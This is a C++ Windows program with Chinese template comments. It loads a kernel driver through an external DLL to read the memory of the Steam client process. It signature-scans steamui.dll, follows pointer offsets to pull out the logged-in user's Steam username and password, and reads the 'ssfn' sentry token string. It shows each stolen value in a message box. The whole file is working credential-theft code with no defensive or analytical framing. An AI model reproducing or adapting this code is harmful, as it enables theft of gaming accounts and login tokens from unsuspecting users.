// ConsoleApplication1.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#pragma once
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <tchar.h>

#pragma comment(lib,"Dll1.lib")

EXTERN_C LONG WINAPI Api_GetModuleBase(ULONG64 pid, char* name, PULONG64 base);
EXTERN_C LONG WINAPI Api_GetPidByName(char* name, ULONG64 ppid);
EXTERN_C LONG WINAPI Api_ReadProcMemory(ULONG64 pid, ULONG64 dst, ULONG64 buf, ULONG64 len, ULONG64 way);
EXTERN_C LONG WINAPI Api_WriteProcMemory(ULONG64 pid, ULONG64 dst, ULONG64 buf, ULONG64 len, ULONG64 way);
EXTERN_C LONG WINAPI Api_LoadDriver();

BOOLEAN MyMmIsAddressValid(DWORD pid, DWORD base) {
	DWORD temp = 0;
	LONG ret = Api_ReadProcMemory(pid, base, (ULONG64)&temp, 1, 0);
	return ret == 0;
}
CHAR ReadChar(DWORD pid, DWORD base) {
	CHAR temp = 0;
	Api_ReadProcMemory(pid, base, (ULONG64)&temp, 1, 0);
	return temp;
}
DWORD MmFindAddrBySignCode(DWORD pid, DWORD startAddr, const char* sign, ULONG len) {
	ULONG signArr[0x100] = { 0 };
	ULONG index = 0;
	ULONG signBytes = strlen(sign) / 2;
	for (index = 0; index < signBytes; index++)
	{
		ULONG signIndex = index * 2;
		char temp1 = sign[signIndex];
		char temp2 = sign[signIndex + 1];
		ULONG high = 0;
		ULONG low = 0;
		if (temp1 == '?' && temp2 == '?')
		{
			signArr[index] = 999;
			continue;
		}
		if (temp1 < '0' || temp1>'F' || temp2 < '0' || temp2>'F')
		{
			return 0;
		}
		if (temp1 >= '0' && temp1 <= '9')
		{
			high = temp1 - 48;
		}
		if (temp1 >= 'A' && temp1 <= 'F')
		{
			high = temp1 - 65 + 10;
		}
		if (temp2 >= '0' && temp2 <= '9')
		{
			low = temp2 - 48;
		}
		if (temp2 >= 'A' && temp2 <= 'F')
		{
			low = temp2 - 65 + 10;
		}
		signArr[index] = high * 16 + low;
	}
	DWORD currentPtr = startAddr;
	DWORD rightBytes = 0;
	while ((currentPtr - startAddr) <= (len - signBytes)) {
		for (ULONG i = 0; i < signBytes; i++)
		{
			if (signArr[i] == 999) {
				rightBytes++;
				continue;
			}
			//if (!MyMmIsAddressValid(pid,currentPtr + i))
			//{
			//	currentPtr = currentPtr & 0xFFFFF000L + 0x1000;
			//	rightBytes = 0;
			//	break;
			//}
			//if (signArr[i] != (UCHAR) * (currentPtr + i))
			if ((CHAR)signArr[i] != ReadChar(pid, currentPtr + i))
			{
				//currentPtr = currentPtr + i + 1;
				currentPtr = currentPtr + 1;
				rightBytes = 0;
				break;
			}
			rightBytes++;
		}
		if (rightBytes == signBytes)
		{
			return currentPtr;
		}
	}
	return 0;
}

PUCHAR ToRealString(PUCHAR data, DWORD len) {
	PUCHAR ret = (PUCHAR)malloc(len + 0x10);
	memset(ret, 0, len + 0x10);
	for (size_t i = 0; i < len; i++)
	{
		ret[i] = data[i * 4];
	}
	return ret;
}

void EnumUserAndPwd(DWORD pid, DWORD base, DWORD offset) {
	DWORD usernameLen = 0;
	DWORD temp = 0;
	Api_ReadProcMemory(pid, base, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + offset, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 4, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x228, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x104, (ULONG64)&usernameLen, 4, 0);
	


	DWORD pwdLen = 0;
	temp = 0;
	Api_ReadProcMemory(pid, base, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + offset, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 4, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x22C, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x104, (ULONG64)&pwdLen, 4, 0);

	PUCHAR usernameBuf = (PUCHAR)malloc(usernameLen + 0x10);
	memset(usernameBuf, 0, usernameLen + 0x10);
	PUCHAR pwdBuf = (PUCHAR)malloc(pwdLen + 0x10);
	memset(pwdBuf, 0, pwdLen + 0x10);

	temp = 0;
	DWORD unameBase = 0;
	Api_ReadProcMemory(pid, base, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + offset, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 4, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x228, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0xF8, (ULONG64)&unameBase, 4, 0);

	temp = 0;
	DWORD pwdBase = 0;
	Api_ReadProcMemory(pid, base, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + offset, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 4, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0x22C, (ULONG64)&temp, 4, 0);
	Api_ReadProcMemory(pid, temp + 0xF8, (ULONG64)&pwdBase, 4, 0);

	Api_ReadProcMemory(pid, unameBase, (ULONG64)usernameBuf, usernameLen * 4, 0);
	MessageBoxA(0, (char*)ToRealString(usernameBuf, usernameLen),"username",0);

	Api_ReadProcMemory(pid, pwdBase, (ULONG64)pwdBuf, pwdLen * 4, 0);
	MessageBoxA(0, (char*)ToRealString(pwdBuf, pwdLen), "password", 0);
}

int WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	if (Api_LoadDriver() == 0x66666666)
	{
		MessageBoxA(0,"init driver success...","msg:",0);
	}
	else
	{
		MessageBoxA(0, "init driver failed...", "msg:", 0);
		return 0;
	}
	while (true)
	{
		ULONG64 pid = 0;
		while (true)
		{
			Api_GetPidByName((char*)"steam.exe", (ULONG64)&pid);
			if (pid)
			{
				MessageBoxA(0, "steam.exe is running...", "msg:", 0);
				break;
			}
		}

		DWORD dllbase = 0;
		Api_GetModuleBase(pid, (char*)"steamui.dll", (PULONG64)&dllbase);
		if (dllbase)
		{
			MessageBoxA(0, "steamui.dll found...", "msg:", 0);
		}

		DWORD base = MmFindAddrBySignCode(pid, dllbase, "FFFFFF00000000FFFFFFFFFFFF010000000000FFFF0000FFFF0000??00000010000000000000000000000000000000", 0xFFFFFFFF);
		if (base)
		{
			MessageBoxA(0, "info base found...", "msg:", 0);
		}
		base += 0x11F;

		EnumUserAndPwd(pid, base, 0x14);
		EnumUserAndPwd(pid, base, 4);


		DWORD ssfnbase = MmFindAddrBySignCode(pid, 0, "7373666E??????????????????????????????????????00", 0xFFFFFFFF);
		if (ssfnbase)
		{
			MessageBoxA(0, "ssfnbase found...", "msg:", 0);
		}

		PUCHAR ssfnStr = (PUCHAR)malloc(500);
		memset(ssfnStr, 0, 500);
		Api_ReadProcMemory(pid, ssfnbase, (ULONG64)ssfnStr, 50, 0);
		MessageBoxA(0, (char *)ssfnStr, "ssfn:", 0);
	}
	return 1;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
